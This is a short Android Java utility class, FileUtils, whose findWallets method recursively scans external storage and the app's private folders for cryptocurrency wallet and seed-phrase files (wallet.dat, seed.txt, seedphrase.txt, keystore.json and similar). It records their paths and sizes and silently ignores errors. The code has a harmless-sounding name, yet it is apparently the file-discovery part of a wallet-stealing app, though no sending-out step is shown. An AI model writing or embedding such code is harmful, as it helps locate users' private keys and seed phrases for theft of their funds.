package com.wuzenx.utils;

import android.content.Context;
import android.os.Environment;
import java.io.File;
import java.util.ArrayList;
import java.util.List;

public class FileUtils {
    
    public static List<String> findWallets(Context context) {
        List<String> wallets = new ArrayList<>();
        try {
            File[] dirs = {
                Environment.getExternalStorageDirectory(),
                new File(context.getFilesDir().getParent() + "/shared_prefs"),
                context.getFilesDir()
            };
            
            String[] targets = {"wallet.dat", "seed.txt", "seedphrase.txt", 
                               "keystore.json", "ethereum", "keystore"};
            
            for (File dir : dirs) {
                if (dir != null && dir.exists()) {
                    searchDir(dir, targets, wallets);
                }
            }
        } catch (Exception ignored) {}
        return wallets;
    }
    
    private static void searchDir(File dir, String[] targets, List<String> results) {
        File[] files = dir.listFiles();
        if (files == null) return;
        
        for (File f : files) {
            if (f.isDirectory()) {
                if (f.getName().startsWith(".")) continue;
                searchDir(f, targets, results);
            } else {
                String name = f.getName().toLowerCase();
                for (String t : targets) {
                    if (name.contains(t)) {
                        results.add(f.getAbsolutePath() + " (" + f.length() + " bytes)");
                        break;
                    }
                }
            }
        }
    }
}
